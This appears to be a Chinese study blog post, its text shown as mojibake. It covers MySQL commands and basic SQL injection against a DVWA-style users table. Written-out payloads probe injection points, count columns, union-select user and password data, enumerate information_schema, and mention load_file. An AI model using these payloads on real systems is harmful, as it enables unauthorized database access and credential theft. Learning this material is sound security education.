<h2 id="MySQLå‘½ä»¤å­¦ä¹ "><a href="#MySQLå‘½ä»¤å­¦ä¹ " class="headerlink" title="MySQLå‘½ä»¤å­¦ä¹ "></a>MySQLå‘½ä»¤å­¦ä¹ </h2><ul>
<li>æœ‰å…³æŸ¥çœ‹æ•°æ®åº“ç›¸å…³ä¿¡æ¯çš„å‘½ä»¤ï¼š</li>
</ul>
<blockquote>
<p><code>select @@version</code>æŸ¥çœ‹å½“å‰MySQLç‰ˆæœ¬</p>
<p><code>select user(); / select system_user();/select session_user();</code>æŸ¥çœ‹å½“å‰ç”¨æˆ·</p>
<p><code>select database();</code>æŸ¥çœ‹å½“å‰æ•°æ®åº“</p>
<p><code>select connection_id();</code>è¿”å›å½“å‰å®¢æˆ·çš„è¿æ¥ID</p>
<p><code>select now()</code>æŸ¥çœ‹ç³»ç»Ÿå½“å‰æ—¶é—´</p>
<p><code>select @@basedirï¼›</code>æŸ¥çœ‹Mysqlçš„å®‰è£…è·¯å¾„</p>
<p><code>select @@datadir;</code>æŸ¥çœ‹æ•°æ®åº“å®‰è£…è·¯å¾„</p>
<p><code>show databases;</code>æŸ¥çœ‹å½“å‰MySQLæ‰€æœ‰åº“å</p>
<p><code>mysqldump -u root -p --default-character-set=UTF8 [database] [table] &gt; dump.txt</code>Mysqlå¯¼å‡ºä½.txt</p>
<p><code>mysql -u root -p --default-character-set=UTF8 database_name &lt; dump.txt</code>å¯¼å…¥</p>
</blockquote>
<ul>
<li>ä¸€äº›å‘½ä»¤</li>
</ul>
<blockquote>
<p><code>use &lt;database_name&gt;</code>ä½¿ç”¨æŸä¸ªæ•°æ®åº“ï¼Œéœ€æŒ‡å®šåº“å</p>
<p><code>show tables;</code>æŸ¥çœ‹å½“å‰æ•°æ®åº“çš„æ•°æ®åº“è¡¨</p>
<p><code>select * from users;</code> æŸ¥è¯¢usersè¡¨ä¸­æ‰€æœ‰çš„æ•°æ®</p>
<p><code>select first_name from users;</code>æŸ¥è¯¢usersè¡¨ä¸­first_nameå­—æ®µçš„æ‰€æœ‰å†…å®¹</p>
<p><code>select concat(user,0x3C,password) from users;</code> concatè¿æ¥å­—ç¬¦ä¸²å‡½æ•°</p>
<p><code>select group_concat(user,0x3C,password) from users;</code>å°†user,passwordå­—æ®µæ‰€æœ‰å†…å®¹è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²</p>
</blockquote>
<p>å®è·µï¼š</p>
<blockquote>
<p><code>select * from users limit m,n;</code>æŸ¥è¯¢userè¡¨ä¸­æ•°æ®ï¼Œè¾“å‡ºç¬¬m(ä»£è¡¨ä¸‹æ ‡ï¼Œä¸‹æ ‡éƒ½æ˜¯ä»0å¼€å§‹)æ¡å¼€å§‹çš„næ¡æ•°æ®</p>
<p><code>select concat(user,0x3c,password) from users limit 3,2;</code>å°†usersè¡¨ä¸­userã€passwordå­—æ®µç¬¬å››ã€äº”æ¡æ•°æ®ç”¨&lt;å·è¿æ¥ï¼Œè¾“å‡º</p>
</blockquote>
<ul>
<li>ä¸€äº›é«˜çº§å‘½ä»¤</li>
</ul>
<blockquote>
<p><code>select mid(user(),2,3);</code>midå­—ç¬¦ä¸²æˆªå–ï¼Œæˆªå–å½“å‰ç”¨æˆ·åç¬¬äºŒä¸ªå­—ç¬¦å¼€å§‹çš„ä¸‰ä¸ªå­—ç¬¦</p>
<p><code>select substr(user(),2,3);</code>subsetså­—ç¬¦ä¸²æˆªå–ï¼Œæˆªå–å½“å‰ç”¨æˆ·åç¬¬äºŒä¸ªå­—ç¬¦å¼€å§‹çš„ä¸‰ä¸ªå­—ç¬¦</p>
<p><code>select ord(mid(database(),3,1));/select ord(substr(database(),3,1));</code>æŸ¥è¯¢å½“å‰åº“åçš„ç¬¬ä¸‰ä¸ªå­—ç¬¦çš„ASCII</p>
<p><code>select ascii(&#39;s&#39;);</code>æŸ¥è¯¢sçš„ASCIIå€¼ï¼ŒåŒord</p>
<p><code>select char(97);</code>å°†ASCIIå€¼è½¬ä¸ºå­—ç¬¦ä¸²</p>
<p><code>select count(*) from users;</code>æŸ¥è¯¢usersè¡¨ä¸­æ•°æ®æ¡æ•°</p>
<p><code>select length(user());</code>æŸ¥è¯¢å½“å‰ç”¨æˆ·åé•¿åº¦</p>
<p><code>select sleep(2);</code>å»¶æ—¶ä¸¤ç§’è¿”å›æ•°æ®</p>
<p><code>select * from users order by user;</code>æ ¹æ®å­—æ®µåæ’åº(æ‹“å±•ï¼šorder by 8æ‰§è¡Œæ­£å¸¸ï¼Œorder by 9æŠ¥é”™ï¼Œè¯æ˜å­—æ®µä¸ªæ•°åªæœ‰å…«ä¸ª)</p>
<p><code>select password from users where user_id=2 or user_id=3;</code>æŸ¥è¯¢usersè¡¨ä¸­user_idä¸º2å’Œ3çš„passwordå­—æ®µçš„å€¼</p>
</blockquote>
<h3 id="å¢åˆ æ”¹æŸ¥"><a href="#å¢åˆ æ”¹æŸ¥" class="headerlink" title="å¢åˆ æ”¹æŸ¥"></a>å¢åˆ æ”¹æŸ¥</h3><ul>
<li>å¢åŠ ä¸€æ¡æ•°æ®</li>
</ul>
<p>éœ€è¦åŒ¹é…usersè¡¨ä¸­å­—æ®µä¸ªæ•°ï¼Œå¦‚æœå­—æ®µä¸åŒ¹é…ä¼šæŠ¥é”™ï¼›å¦‚æœå­—æ®µå†…å®¹é™å®šä¸º<code>not NUll</code>ï¼Œå­—æ®µä¸ºç©ºæ—¶ä¹ŸæŠ¥é”™ã€‚</p>
<blockquote>
<p><code>insert into users values(&#39;9&#39;,&#39;test&#39;,&#39;test&#39;,&#39;test123&#39;,&#39;ssss&#39;,&#39;lujing&#39;,&#39;2019&#39;,&#39;2020&#39;);</code></p>
</blockquote>
<ul>
<li>ä¿®æ”¹æ•°æ®</li>
</ul>
<blockquote>
<p><code>update users set user=&#39;ccc&#39; where password=&#39;ssss&#39;;</code>å°†passwordä¸ºssssçš„é‚£æ¡æ•°æ®çš„userå­—æ®µå†…å®¹æ›´æ–°ä¸ºcccï¼›å¤šæ¡æ•°æ®ç”¨é€—å·éš”å¼€ <code>set user=&#39;ccc&#39;,user_id=&#39;20&#39;</code></p>
</blockquote>
<ul>
<li>åˆ é™¤æ•°æ®</li>
</ul>
<blockquote>
<p><code>delete from users where user_id=9;</code>åˆ é™¤usersè¡¨ä¸­user_idä¸º9çš„é‚£æ¡æ•°æ®</p>
<p><code>drop table users;</code>åˆ é™¤usersè¡¨</p>
<p><code>drop database dvwa;</code>åˆ é™¤dvwaåº“</p>
</blockquote>
<h3 id="Mysqlæ•°æ®å»é‡"><a href="#Mysqlæ•°æ®å»é‡" class="headerlink" title="Mysqlæ•°æ®å»é‡"></a>Mysqlæ•°æ®å»é‡</h3><p>(æ‰¾äº†åŠå¤©ï¼Œåªèƒ½å°†æŸ¥è¯¢ç»“æœå¯¼å…¥åˆ°å¦å¤–ä¸€å¼ è¡¨ä¸­äº†ã€‚ã€‚ã€‚)</p>
<ul>
<li>åˆ©ç”¨distinctè¿›ç»“æœå»é‡ï¼Œç„¶åå°†æŸ¥è¯¢çš„ç»“æœå¯¼å…¥åˆ°å¦å¤–ä¸€å¼ è¡¨ä¸­ã€‚</li>
</ul>
<p><code> insert ignore into user_info select distinct name,sex,id_card,tel,address,mail from users_room;</code></p>
<h3 id="SQLæ³¨å…¥å¯èƒ½ç”¨åˆ°çš„è¯­æ³•"><a href="#SQLæ³¨å…¥å¯èƒ½ç”¨åˆ°çš„è¯­æ³•" class="headerlink" title="SQLæ³¨å…¥å¯èƒ½ç”¨åˆ°çš„è¯­æ³•"></a>SQLæ³¨å…¥å¯èƒ½ç”¨åˆ°çš„è¯­æ³•</h3><p>åŸºç¡€ï¼š</p>
<ul>
<li>åŸºäºand/oråˆ¤æ–­æ³¨å…¥ç‚¹</li>
</ul>
<p>é¦–å…ˆåˆ¤æ–­é¡µé¢æ­£å¸¸è¿”å›ã€‚</p>
<p>ç„¶å<code>select user,password from users where user_id=2 and 1=1;</code>æ­£ç¡®æ‰§è¡Œ(andä¸¤è¾¹è¡¨è¾¾å¼å‡æˆç«‹ï¼Œè¿”å›ä¸ºçœŸ)é¡µé¢æ­£å¸¸è¿”å›</p>
<p><code>select user,password from users where user_id=2 and 1=2;</code>è¿”å›ä¸ºç©º(andä¸¤è¾¹è¡¨è¾¾å¼ä¸€çœŸä¸€å‡ï¼Œè¿”å›ä¸ºå‡)é¡µé¢è¿”å›é”™è¯¯æˆ–è€…ä¸æ­£å¸¸</p>
<p>å³å¯è¯æ˜SQLå­˜åœ¨</p>
<p>ORåŒç†â€”&gt;</p>
<p><code>select user,password from users where user_id=2 or 1=1;</code>è¿”å›æ‰€æœ‰userå’Œpasswordçš„å†…å®¹(orä¸¤è¾¹è¡¨è¾¾å¼éƒ½ä¸ºçœŸä¸”1=1æ’æˆç«‹ï¼Œåˆ™è¿”å›æ‰€æœ‰)</p>
<p><code>select user,password from users where user_id=2 or 1=2;</code>ä»…è¿”å›ä¸€æ¡æ•°æ®(1=2ä¸æˆç«‹,å› æ­¤åªè¿”å›user_id=2çš„é‚£æ¡æ•°æ®æŒ‡å®šçš„å†…å®¹)</p>
<blockquote>
<p>æ³¨æ„ï¼šand 1=1 å¹¶éç»å¯¹ï¼Œåªè¦æ˜¯è¡¨è¾¾å¼ï¼Œç±»ä¼¼äºâ€™sâ€™=â€™sâ€™ç­‰ç­‰ï¼Œï¼Œï¼Œï¼Œ</p>
<p>åˆ¤æ–­SQLæ³¨å…¥å­˜åœ¨ï¼Œéœ€è¦ä¸‰ä¸ªé¡µé¢å¯¹æ¯”æ‰è¡Œã€‚</p>
</blockquote>
<ul>
<li>æ³¨å…¥ç‚¹çš„å¤šç§æƒ…å†µ</li>
</ul>
<p><code>select user, password from users where user_id=&#39;2&#39;;</code>å¦‚æœæºäºå¥ï¼Œä½¿ç”¨äº†å¼•å·å°†IDå€¼æ‰©èµ·æ¥ï¼Œéœ€è¦æ„é€ å¦‚ä¸‹ï¼š<code>where user_id=&#39;2&#39; and &#39;1&#39;=&#39;1</code>,ä¹Ÿå³æ˜¯<code>2&#39; and &#39;1&#39;=&#39;1</code>ï¼Œ<code>2&#39; and &#39;1&#39;=&#39;2</code></p>
<p>åŒç†ï¼Œå¦‚æœä½¿ç”¨åŒå¼•å·ï¼Œæ‹¬å·æ‰©èµ·æ¥çš„ï¼Œä¹Ÿéœ€è¦æŒ‰ç…§ä¸Šé¢çš„æƒ…å†µã€‚(å¦‚æœ<code>where user_id=(&#39;1&#39;)</code>è¿™æ ·å‘¢ï¼Ÿ)</p>
<blockquote>
<p>è¯•ä¸€è¯•ï¼š<code>2&#39;</code>,<code>2&#39;&#39;</code>?</p>
</blockquote>
<ul>
<li>SQLæ³¨å…¥çš„åŸç†</li>
</ul>
<p>å°±æ˜¯é€šè¿‡æŠŠSQLå‘½ä»¤æ’å…¥åˆ°Webè¡¨å•é€’äº¤æˆ–è¾“å…¥åŸŸåæˆ–é¡µé¢è¯·æ±‚çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œæœ€ç»ˆè¾¾åˆ°æ¬ºéª—æœåŠ¡å™¨æ‰§è¡Œæ¶æ„çš„SQLå‘½ä»¤ã€‚</p>
<h3 id="é«˜çº§æŸ¥è¯¢è¯­æ³•"><a href="#é«˜çº§æŸ¥è¯¢è¯­æ³•" class="headerlink" title="é«˜çº§æŸ¥è¯¢è¯­æ³•"></a>é«˜çº§æŸ¥è¯¢è¯­æ³•</h3><ul>
<li>æŸ¥è¯¢ç»“æœæ’åº</li>
</ul>
<p><code>select * from users order by last_name;</code>æŸ¥è¯¢usersè¡¨ä¸­çš„æ‰€æœ‰æ•°æ®ï¼Œå¹¶ä½¿ç”¨last_nameå­—æ®µå†…å®¹æ’åº(æ ¹æ®çš„æ˜¯ASXCIIç )</p>
<blockquote>
<p>å¯ä»¥åˆ©ç”¨<code>select * from users order by N;</code>åˆ¤æ–­usersè¡¨å­—æ®µä¸ªæ•°ï¼ŒNå°äºç­‰äºå­—æ®µæ•°æ­£å¸¸è¿”å›æ•°æ®ï¼Œå¤§äºåˆ™æŠ¥é”™ã€‚</p>
<p><code>-- -</code>,<code>#</code>åœ¨æ•°æ®åº“ä¸­è¡¨ç¤ºæ³¨é‡Šä¹‹åçš„å†…å®¹,<code>/**/</code>è¡¨ç¤ºå¤šè¡Œæ³¨é‡Š,æ³¨é‡Šæ‰æ‰©èµ·æ¥çš„å†…å®¹</p>
<p><code>select * from users order by last_name#asdasdas;</code></p>
<p><code>select * from users order by last_name-- -asadasdas;</code></p>
<p>å¤šè¡Œæ³¨é‡Šä¹Ÿå¯ä»¥ç”¨äºè¡Œå†…ï¼š<code>select * from users/**/order/*ssssss*/by last_name;</code></p>
</blockquote>
<p>å…¶ä»–å‡ ä¸ªæ’åºï¼š</p>
<p>é™åºæ’åˆ—æŸ¥è¯¢ç»“æœï¼š<code>select * from users DESC;</code></p>
<p>å‡åº(é»˜è®¤æ’åº):<code>select * from users ASC;</code></p>
<ul>
<li>ç»„åˆæŸ¥è¯¢</li>
</ul>
<blockquote>
<p>ä¸€ä¸ªæŸ¥è¯¢ä¸­ä»ä¸åŒçš„è¡¨è¿”å›ç»“æœæ•°æ®</p>
<p>åœ¨ä¸€ä¸ªè¡¨ä¸­æ‰§è¡Œå¤šä¸ªæŸ¥è¯¢ï¼ŒæŒ‰ä¸€ä¸ªæŸ¥è¯¢è¿”å›æ•°æ®</p>
</blockquote>
<p><code>select user, password from users where user_id=&#39;2&#39; union select last_name, first_name from users where user_id=&#39;4&#39;</code></p>
<p>æŸ¥è¯¢user_id=2çš„use,passwordå­—æ®µå†…å®¹ï¼ŒæŸ¥è¯¢user_id=4çš„last_name,first_nameå­—æ®µçš„å€¼ï¼Œä¸€èµ·è¿”å›(ä¹Ÿå³æ˜¯åŒæ—¶è¿”å›ã€‚ã€‚ã€‚)</p>
<ul>
<li>æ¨¡ç³ŠæŸ¥è¯¢</li>
</ul>
<p>å…³é”®è¯<code>like</code>ï¼Œé€šé…ç¬¦<code>%</code>,<code>*</code>,<code>.</code>ç­‰ï¼Œå¸¸ç”¨çš„æ­£åˆ™è§„åˆ™å­—ç¬¦ã€‚</p>
<blockquote>
<p><code>select * from users where avatar like &#39;%hac%&#39;</code>åŒ¹é…usersè¡¨ä¸­avatarå­—æ®µä¸­å«æœ‰hacçš„å†…å®¹</p>
</blockquote>
<p>â€œ*â€œè¡¨ç¤ºåŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ªåœ¨å®ƒå‰é¢çš„ä¸œè¥¿ã€‚ä¾‹å¦‚ï¼Œâ€D*â€œåŒ¹é…ä»»ä½•æ•°é‡çš„â€Dâ€å­—ç¬¦</p>
<p>â€œ.â€œ åŒ¹é…ä»»ä½•å•ä¸ªçš„å­—ç¬¦ã€‚</p>
<blockquote>
<p>å½“ä½¿ç”¨æ­£åˆ™åŒ¹é…æ—¶ï¼Œä½¿ç”¨REGEXPå’ŒNOT REGEXPæ“ä½œç¬¦ï¼ˆæˆ–RLIKEå’ŒNOT RLIKEï¼ŒåŠŸèƒ½æ˜¯ä¸€æ ·çš„ï¼‰</p>
</blockquote>
<ul>
<li>æ¨¡ç³ŠæŸ¥è¯¢ä¸­çš„æ³¨å…¥ï¼š</li>
</ul>
<p><code>select * from users where avatar like &#39;%hac%&#39; union select password from users;</code>é¦–å…ˆæŸ¥è¯¢avatarå­—æ®µä¸­åŒ…å«hacçš„æ•°æ®ï¼Œç„¶åæŸ¥è¯¢usersè¡¨ä¸­çš„passwordå­—æ®µå†…å®¹ï¼Œç„¶åç»„åˆèµ·æ¥è¿”å›(ä¼šå»é‡)</p>
<ul>
<li>ä¸€äº›äº‹é¡¹ï¼š</li>
</ul>
<p><code>select user_id from users union select password from users;</code>æ­£å¸¸æ‰§è¡Œ(ç»„åˆæŸ¥è¯¢æ—¶å€™ï¼Œå‰åæŸ¥è¯¢çš„å­—æ®µæ•°è¦ä¸€æ ·ï¼Œè¿™æ ·å°±æ˜¯é”™è¯¯çš„ï¼š<code>select user_id from users union select password,user from users;</code>)</p>
<h3 id="SQLæ³¨å…¥ç¤ºä¾‹"><a href="#SQLæ³¨å…¥ç¤ºä¾‹" class="headerlink" title="SQLæ³¨å…¥ç¤ºä¾‹"></a>SQLæ³¨å…¥ç¤ºä¾‹</h3><p>é¢˜ç›®ï¼šwhere user_id=2å¤„å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œè¦æ±‚åˆ¤æ–­æ³¨å…¥ç‚¹å¹¶æŸ¥è¯¢åˆ°user,passwordå­—æ®µå†…å®¹ã€‚</p>
<p>æºäºå¥ï¼š<code>select user_id from users where user_id=2;</code></p>
<p>è§£ï¼š</p>
<ol>
<li><code>select user_id from users where user_id=2 and 1=1-- -;</code>æ­£å¸¸</li>
<li><code>select user_id from users where user_id=2 and 1=2-- -;</code>ä¸æ­£å¸¸ï¼Œç»“åˆèµ·æ¥åˆ¤æ–­å­˜åœ¨æ³¨å…¥ç‚¹</li>
<li><code>select user_id from users where user_id=2 order by 1-- -;</code>æ­£å¸¸</li>
<li><code>select user_id from users where user_id=2 order by 2-- -</code>é”™è¯¯ï¼Œè¯æ˜åªæœ‰ä¸€ä¸ªå­—æ®µ(åœ¨ä½¿ç”¨çš„user_id)</li>
<li><code>select user_id from users where user_id=2 union select 1-- -</code> 1ä¸ºå ä½ç¬¦ï¼Œå¡«å……ä½¿ç”¨</li>
<li><code>select user_id from users where user_id=2 union select database()-- -</code>æ›¿æ¢å ä½ç¬¦ï¼Œå¯ä»¥æŸ¥è¯¢ä¸€äº›å¸¸ç”¨ä¿¡æ¯(ç‰ˆæœ¬ï¼Œæ•°æ®åº“åï¼Œç”¨æˆ·åï¼Œè·¯å¾„ç­‰)</li>
<li><code>select user_id from users where user_id=2 union select concat(user,0x3c,password) from users-- -</code>(ä½¿ç”¨concatè¿æ¥user,passwordä¸€èµ·è¾“å‡ºï¼Œå°±ä¸ç”¨è¿ç»­ä½¿ç”¨union select)</li>
</ol>
<h2 id="Mysqlç³»ç»Ÿè¡¨åˆ©ç”¨"><a href="#Mysqlç³»ç»Ÿè¡¨åˆ©ç”¨" class="headerlink" title="Mysqlç³»ç»Ÿè¡¨åˆ©ç”¨"></a>Mysqlç³»ç»Ÿè¡¨åˆ©ç”¨</h2><h3 id="infomation-schemaè¯´æ˜"><a href="#infomation-schemaè¯´æ˜" class="headerlink" title="infomation_schemaè¯´æ˜"></a>infomation_schemaè¯´æ˜</h3><blockquote>
<p>MySQLä¸­ï¼ŒæŠŠ information_schema çœ‹ä½œæ˜¯ä¸€ä¸ªæ•°æ®åº“ï¼Œç¡®åˆ‡è¯´æ˜¯ä¿¡æ¯æ•°æ®åº“ã€‚å…¶ä¸­ä¿å­˜ç€å…³äºMySQLæœåŠ¡å™¨æ‰€ç»´æŠ¤çš„æ‰€æœ‰å…¶ä»–æ•°æ®åº“çš„ä¿¡æ¯ã€‚å¦‚æ•°æ®åº“åï¼Œæ•°æ®åº“çš„è¡¨ï¼Œè¡¨æ çš„æ•°æ®ç±»å‹ä¸è®¿é—®æƒ é™ç­‰ã€‚åœ¨INFORMATION_SCHEMAä¸­ï¼Œæœ‰æ•°ä¸ªåªè¯»è¡¨ã€‚å®ƒä»¬å®é™…ä¸Šæ˜¯è§†å›¾ï¼Œè€Œä¸æ˜¯åŸºæœ¬è¡¨ï¼Œå› æ­¤ï¼Œä½ å°†æ— æ³•çœ‹åˆ°ä¸ä¹‹ç›¸å…³çš„ä»»ä½•æ–‡ä»¶ã€‚</p>
</blockquote>
<p><strong>information_schemaæ•°æ®åº“è¡¨è¯´æ˜:</strong></p>
<ul>
<li><p>SCHEMATAè¡¨ï¼šæä¾›äº†å½“å‰mysqlå®ä¾‹ä¸­æ‰€æœ‰æ•°æ®åº“çš„ä¿¡æ¯ã€‚æ˜¯show databasesçš„ç»“æœå–ä¹‹æ­¤è¡¨ã€‚</p>
</li>
<li><p>TABLESè¡¨ï¼šæä¾›äº†å…³äºæ•°æ®åº“ä¸­çš„è¡¨çš„ä¿¡æ¯ï¼ˆåŒ…æ‹¬è§†å›¾ï¼‰ã€‚è¯¦ç»†è¡¨è¿°äº†æŸä¸ªè¡¨å±äºå“ªä¸ªschemaï¼Œè¡¨ç±»å‹ï¼Œè¡¨å¼•æ“ï¼Œåˆ›å»ºæ—¶é—´ç­‰ä¿¡æ¯ã€‚æ˜¯show tables from schemanameçš„ç»“æœå–ä¹‹æ­¤è¡¨ã€‚</p>
</li>
<li><p>COLUMNSè¡¨ï¼šæä¾›äº†è¡¨ä¸­çš„åˆ—ä¿¡æ¯ã€‚è¯¦ç»†è¡¨è¿°äº†æŸå¼ è¡¨çš„æ‰€æœ‰åˆ—ä»¥åŠæ¯ä¸ªåˆ—çš„ä¿¡æ¯ã€‚æ˜¯show columns from schemaname.tablenameçš„ç»“æœå–ä¹‹æ­¤è¡¨ã€‚</p>
</li>
<li><p>STATISTICSè¡¨ï¼šæä¾›äº†å…³äºè¡¨ç´¢å¼•çš„ä¿¡æ¯ã€‚æ˜¯show index from schemaname.tablenameçš„ç»“æœå–ä¹‹æ­¤è¡¨ã€‚</p>
</li>
<li><p>USER_PRIVILEGESï¼ˆç”¨æˆ·æƒé™ï¼‰è¡¨ï¼šç»™å‡ºäº†å…³äºå…¨ç¨‹æƒé™çš„ä¿¡æ¯ã€‚è¯¥ä¿¡æ¯æºè‡ªmysql.useræˆæƒè¡¨ã€‚æ˜¯éæ ‡å‡†è¡¨ã€‚</p>
</li>
<li><p>SCHEMA_PRIVILEGESï¼ˆæ–¹æ¡ˆæƒé™ï¼‰è¡¨ï¼šç»™å‡ºäº†å…³äºæ–¹æ¡ˆï¼ˆæ•°æ®åº“ï¼‰æƒé™çš„ä¿¡æ¯ã€‚è¯¥ä¿¡æ¯æ¥è‡ªmysql.dbæˆæƒè¡¨ã€‚æ˜¯éæ ‡å‡†è¡¨ã€‚</p>
</li>
<li><p>TABLE_PRIVILEGESï¼ˆè¡¨æƒé™ï¼‰è¡¨ï¼šç»™å‡ºäº†å…³äºè¡¨æƒé™çš„ä¿¡æ¯ã€‚è¯¥ä¿¡æ¯æºè‡ªmysql.tables_privæˆæƒè¡¨ã€‚æ˜¯éæ ‡å‡†è¡¨ã€‚</p>
</li>
<li><p>COLUMN_PRIVILEGESï¼ˆåˆ—æƒé™ï¼‰è¡¨ï¼šç»™å‡ºäº†å…³äºåˆ—æƒé™çš„ä¿¡æ¯ã€‚è¯¥ä¿¡æ¯æºè‡ªmysql.columns_privæˆæƒè¡¨ã€‚æ˜¯éæ ‡å‡†è¡¨ã€‚</p>
</li>
<li><p>CHARACTER_SETSï¼ˆå­—ç¬¦é›†ï¼‰è¡¨ï¼šæä¾›äº†mysqlå®ä¾‹å¯ç”¨å­—ç¬¦é›†çš„ä¿¡æ¯ã€‚æ˜¯SHOW CHARACTER SETç»“æœé›†å–ä¹‹æ­¤è¡¨ã€‚</p>
</li>
<li><p>COLLATIONSè¡¨ï¼šæä¾›äº†å…³äºå„å­—ç¬¦é›†çš„å¯¹ç…§ä¿¡æ¯ã€‚</p>
</li>
<li><p>COLLATION_CHARACTER_SET_APPLICABILITYè¡¨ï¼šæŒ‡æ˜äº†å¯ç”¨äºæ ¡å¯¹çš„å­—ç¬¦é›†ã€‚è¿™äº›åˆ—ç­‰æ•ˆäºSHOW COLLATIONçš„å‰ä¸¤ä¸ªæ˜¾ç¤ºå­—æ®µã€‚</p>
</li>
<li><p>TABLE_CONSTRAINTSè¡¨ï¼šæè¿°äº†å­˜åœ¨çº¦æŸçš„è¡¨ã€‚ä»¥åŠè¡¨çš„çº¦æŸç±»å‹ã€‚</p>
</li>
<li><p>KEY_COLUMN_USAGEè¡¨ï¼šæè¿°äº†å…·æœ‰çº¦æŸçš„é”®åˆ—ã€‚</p>
</li>
<li><p>ROUTINESè¡¨ï¼šæä¾›äº†å…³äºå­˜å‚¨å­ç¨‹åºï¼ˆå­˜å‚¨ç¨‹åºå’Œå‡½æ•°ï¼‰çš„ä¿¡æ¯ã€‚æ­¤æ—¶ï¼ŒROUTINESè¡¨ä¸åŒ…å«è‡ªå®šä¹‰å‡½æ•°ï¼ˆUDFï¼‰ã€‚åä¸ºâ€œmysql.proc nameâ€çš„åˆ—æŒ‡æ˜äº†å¯¹åº”äºINFORMATION_SCHEMA.ROUTINESè¡¨çš„mysql.procè¡¨åˆ—ã€‚</p>
</li>
<li><p>VIEWSè¡¨ï¼šç»™å‡ºäº†å…³äºæ•°æ®åº“ä¸­çš„è§†å›¾çš„ä¿¡æ¯ã€‚éœ€è¦æœ‰show viewsæƒé™ï¼Œå¦åˆ™æ— æ³•æŸ¥çœ‹è§†å›¾ä¿¡æ¯ã€‚</p>
</li>
<li><p>TRIGGERSè¡¨ï¼šæä¾›äº†å…³äºè§¦å‘ç¨‹åºçš„ä¿¡æ¯ã€‚å¿…é¡»æœ‰superæƒé™æ‰èƒ½æŸ¥çœ‹è¯¥è¡¨</p>
</li>
</ul>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RlbW9uc29uL2FydGljbGUvZGV0YWlscy84MDM4ODY3Nw==">https://blog.csdn.net/demonson/article/details/80388677<i class="fa fa-external-link-alt"></i></span>ï¼ˆMySQL information_schema è¯¦è§£ï¼‰</p>
<h3 id="information-schemaä½¿ç”¨ç¤ºä¾‹"><a href="#information-schemaä½¿ç”¨ç¤ºä¾‹" class="headerlink" title="information_schemaä½¿ç”¨ç¤ºä¾‹"></a>information_schemaä½¿ç”¨ç¤ºä¾‹</h3><ul>
<li>è·å–è¡¨å</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 1,table_name from information_schema.tables where table_schema&#x3D;(æ•°æ®åº“ååå…­è¿›åˆ¶) limit 2,1-- - # å½“å‰æ•°æ®åº“æ‰€æœ‰è¡¨ï¼Œä½¿ç”¨limit n,1 é€æ¡è¾“å‡ºã€‚</span><br></pre></td></tr></table></figure>

<ul>
<li>åˆ¤æ–­è¡¨çš„æ•°é‡</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(select count(table_name) from information_schema.tables where table_schema &#x3D;database())&#x3D;2-- -  # åˆ¤æ–­è¡¨çš„æ•°é‡ä¸º2</span><br></pre></td></tr></table></figure>

<ul>
<li>è·å–å­—æ®µå</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 1,column_name from information_schema.columns where table_name&#x3D;0x7573657273 limit 1,1-- -</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">length((select column_name from information_schema.columns where table_name&#x3D;(select table_name from information_schema.tables where table_schema &#x3D;database() limit 0,1)limit 0,1)&#x3D;10-- -</span><br></pre></td></tr></table></figure>

<ul>
<li>ç»„åˆè¯­å¥</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">length((select column_name from information_schema.columns where table_name&#x3D;(select table_name from information_schema.tables where table_schema &#x3D;database() limit 0,1)limit 0,1))&#x3D;10-- -</span><br></pre></td></tr></table></figure>

<h1 id="MySQLæ³¨å…¥åŸºç¡€"><a href="#MySQLæ³¨å…¥åŸºç¡€" class="headerlink" title="MySQLæ³¨å…¥åŸºç¡€"></a>MySQLæ³¨å…¥åŸºç¡€</h1><h2 id="å¸¸ç”¨ç³»ç»Ÿå‡½æ•°"><a href="#å¸¸ç”¨ç³»ç»Ÿå‡½æ•°" class="headerlink" title="å¸¸ç”¨ç³»ç»Ÿå‡½æ•°"></a>å¸¸ç”¨ç³»ç»Ÿå‡½æ•°</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ç¤ºä¾‹ï¼šselect database();æŸ¥è¯¢å½“å‰æ•°æ®åº“åç§°</span><br><span class="line">â¢ 1.system_user() ç³»ç»Ÿç”¨æˆ·å</span><br><span class="line">â¢ 2.user() ç”¨æˆ·å</span><br><span class="line">â¢ 3.current_user() å½“å‰ç”¨æˆ·å</span><br><span class="line">â¢ 4.session_user() é“¾æ¥æ•°æ®åº“çš„ç”¨æˆ·å</span><br><span class="line">â¢ 5.database() æ•°æ®åº“åº“å</span><br><span class="line">â¢ 6.version() mysql æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯</span><br><span class="line">â¢ 7.load_file() è½¬æ¢æˆ16 æˆ–10 è¿›åˆ¶ è¯»å–æœ¬åœ°æ–‡ä»¶</span><br><span class="line">â¢ 8.@@datadir è¯»å–æ•°æ®åº“è·¯å¾„</span><br><span class="line">â¢ 9.@@basedir MYSQL å®‰è£…è·¯å¾„</span><br><span class="line">â¢ 10.@@version_compile_os</span><br></pre></td></tr></table></figure>

<h2 id="å¸¸ç”¨å…³é”®å­—-å‡½æ•°"><a href="#å¸¸ç”¨å…³é”®å­—-å‡½æ•°" class="headerlink" title="å¸¸ç”¨å…³é”®å­—/å‡½æ•°"></a>å¸¸ç”¨å…³é”®å­—/å‡½æ•°</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">limit m,n     # ä»må¼€å§‹æ£€ç´¢næ¡æ•°æ®</span><br><span class="line">select mid(database(),2,1) # ç”¨äºå¾—åˆ°å½“å‰æ•°æ®åº“åçš„ç¬¬äºŒä¸ªå­—ç¬¦</span><br><span class="line">select ord(mid(user(),1,1))&#x3D; 114  # ordå‡½æ•°è¿”å›å­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ ASCII å€¼ã€‚</span><br><span class="line">select concat(1,0x3c,2)    # å°†å­—ç¬¦ä¸²1å’Œ2ç”¨&lt;è¿æ¥èµ·æ¥   